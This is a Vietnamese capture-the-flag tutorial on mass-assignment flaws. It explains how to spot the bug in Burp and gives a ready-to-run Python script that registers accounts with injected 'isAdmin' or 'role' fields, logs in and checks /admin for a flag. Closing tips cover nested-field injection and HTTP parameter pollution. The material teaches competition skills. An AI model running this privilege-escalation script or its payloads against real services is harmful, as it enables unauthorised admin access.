# Mass Assignment (server gán thẳng mọi field bạn gửi lên)

Khi bạn gửi 1 form đăng ký (tên, email, mật khẩu), server lẽ ra chỉ nên lấy đúng vài field cần, còn field khác như quyền hạn (`role`) thì server phải tự quyết định, không để người dùng tự chọn. Nhưng nhiều lập trình viên viết code theo kiểu "lấy nguyên cả object bạn gửi lên, nhét thẳng vào database cho nhanh" — không lọc field nào được phép, field nào không. Vì vậy bạn chỉ cần tự thêm 1 field lạ, ví dụ `"isAdmin": true`, vào body JSON (dù form gốc không có ô nào cho field đó), server vẫn gán luôn. Giống việc nộp đơn xin việc chỉ có ô "tên, kinh nghiệm", nhưng người nhận đơn lại chép y nguyên cả dòng bạn tự thêm vào "chức vụ: giám đốc" vào hồ sơ chính thức mà không kiểm tra lại.

Trên Burp bạn nhận ra lỗi này khi: có request POST đăng ký/sửa hồ sơ gửi JSON, Response trả về nguyên object vừa tạo (nhiều field hơn những gì có trên giao diện) — bạn thêm field nghi ngờ như `isAdmin`/`role` vào body, Send, và thấy field đó xuất hiện trong Response với đúng giá trị bạn gửi, dù giao diện không hề có ô nhập cho nó.

## Snippet copy-là-chạy

```python
import re
import requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")
# Thử nhiều tên field hay dùng cho quyền admin -- không cần biết đúng tên ngay từ đầu
FIELD_CANDIDATES = ["isAdmin", "is_admin", "admin", "role"]


def solve_one(session, base_url):
    # Bước 1: đăng ký thường, không thêm gì lạ -- để xem Response lộ field nào
    r0 = session.post(
        f"{base_url}/register",
        json={"username": "probe1", "password": "pwn123"},
        timeout=5,
    )
    try:
        print("Response đăng ký thường:", r0.json())  # tìm field lạ kiểu "is_admin": false
    except Exception:
        pass  # không phải JSON cũng không sao, vẫn thử tiếp các field dưới

    # Bước 2: thử từng field ứng viên, mỗi lần tạo 1 tài khoản mới kèm field đó = true/"admin"
    for field in FIELD_CANDIDATES:
        value = "admin" if field == "role" else True
        username = f"pwn_{field}"
        session.post(
            f"{base_url}/register",
            json={"username": username, "password": "pwn123", field: value},
            timeout=5,
        )

        # Bước 3: đăng nhập lại bằng tài khoản vừa tạo, kiểm tra có vào được trang admin không
        s2 = requests.Session()
        s2.post(
            f"{base_url}/login",
            json={"username": username, "password": "pwn123"},
            timeout=5,
        )
        check = s2.get(f"{base_url}/admin", timeout=5)
        m = FLAG_RE.search(check.text)
        if m:
            return m.group(0)

    return None


if __name__ == "__main__":
    s = requests.Session()
    s.verify = False
    print("Flag:", solve_one(s, "http://target"))
```

## Giải thích cho người mới

- Bước 1 chỉ đăng ký 1 tài khoản "sạch" (không kèm field lạ) để đọc Response — nhiều app vô tình trả lại nguyên bản ghi vừa tạo, giúp bạn thấy tên field thật (ví dụ `is_admin` chứ không phải `isAdmin`) trước khi đoán.
- Vòng `for field in FIELD_CANDIDATES`: thay vì tay đổi field trong Burp Repeater từng lần, code tự đổi tên field và thử lại — vẫn đúng là việc bạn làm tay, chỉ tự động hoá lặp qua nhiều khả năng.
- Mỗi lần thử phải **tạo 1 username mới khác nhau** (`pwn_{field}`) để không bị lỗi "username đã tồn tại" ở lần thử sau.
- Sau khi đăng ký, phải **đăng nhập lại** bằng session mới rồi mới gọi `/admin` — vì Mass Assignment chỉ sửa được dữ liệu lúc tạo bản ghi, phải đăng nhập lại để nhận quyền (cookie/session) phản ánh đúng dữ liệu mới.
- Dạng khác của lỗi này: thử field lồng trong object con, ví dụ `{"username": "x", "profile": {"role": "admin"}}` — một số server chỉ lọc field cấp ngoài cùng (top-level), quên lọc field nằm sâu bên trong.

## Lưu ý nhanh

- Chi phí thử gần như bằng 0 — luôn thử kèm `isAdmin`/`is_admin`/`role`/`admin` trong body của BẤT KỲ request tạo/sửa dữ liệu nào, kể cả khi giao diện không có ô nào cho nó.
- Nếu field cấp ngoài cùng bị chặn (báo lỗi 400), thử lồng vào object con (`profile`, `settings`) — nhiều server chỉ kiểm tra field cấp 1.
- HTTP Parameter Pollution (gửi trùng tên tham số 2 lần, ví dụ `role=user&role=admin`) là 1 biến thể khác: các tầng xử lý khác nhau (WAF, app) có thể đọc giá trị đầu hoặc giá trị cuối khác nhau — thử cả 2 thứ tự.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
